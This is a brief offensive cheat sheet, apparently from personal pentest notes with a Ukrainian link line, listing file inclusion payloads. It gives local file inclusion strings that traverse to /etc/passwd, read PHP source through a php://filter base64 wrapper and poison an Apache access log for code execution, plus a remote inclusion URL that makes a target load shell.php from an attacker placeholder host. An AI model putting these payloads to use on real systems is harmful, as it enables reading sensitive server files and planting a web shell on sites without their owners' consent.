# File Inclusion (LFI / RFI)

## LFI
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
/var/log/apache2/access.log     # log poisoning -> RCE
```
## RFI
```
http://<IP>/page?file=http://<ATTACKER>/shell.php
```
**Зв'язки:** [[Shells-Payloads]]
